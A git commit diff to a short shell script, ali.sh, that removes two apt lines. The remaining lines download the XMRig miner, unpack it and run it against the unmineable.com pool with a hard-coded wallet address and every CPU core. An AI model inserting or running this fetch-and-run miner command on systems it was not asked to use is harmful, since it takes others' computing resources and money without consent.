e3e181ec17fc3ad5a71417b74f09723975d8c436
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2023-08-22 22:57:45 +0300

    Update ali.sh

--- ali.sh
+++ ali.sh
@@ -1,5 +1,3 @@
-apt update
 apt install screen -y
 screen
-apt install wget -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.2 --threads=8 -p x -t $(nproc)
